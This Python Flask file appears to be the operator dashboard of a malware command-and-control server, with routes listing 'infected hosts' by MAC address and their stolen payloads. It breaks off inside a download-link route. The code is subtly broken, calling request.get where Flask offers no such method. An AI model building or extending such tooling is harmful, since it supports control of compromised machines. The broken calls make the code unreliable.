#!/usr/bin/env python3

from flask import Flask, render_template, request
import json
import os
import sys

# Constants
FILEPATH = os.path.abspath(__file__)

# Path modification for project dependencies
def parent_chain(path, n):
    for i in range(n):
        path = os.path.dirname(path)
    return path
sys.path.insert(1, parent_chain(FILEPATH, 2))

from lib.database import Database

# Flask app
app = Flask(__name__)
database = Database.get_default()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/get_infected_hosts')
def get_infected_hosts():
    mac_addresses = database.get_all_mac_addresses()
    flat_list = [item for sublist in mac_addresses for item in sublist]
    return json.dumps(flat_list)

@app.route('/get_payloads', methods=['GET'])
def get_payloads():
    mac_address = request.get('mac_address')
    data = database.get_all_payload_names(mac_address)
    return json.dumps([{
        'payload_id': entry[0],
        'name': entry[1]
    } for entry in data])

@app.route('/get_download_link', methods=['GET'])
def get_download_link():
    mac_address = request.get('mac_address')
    payload_id = request.get('payload_id')
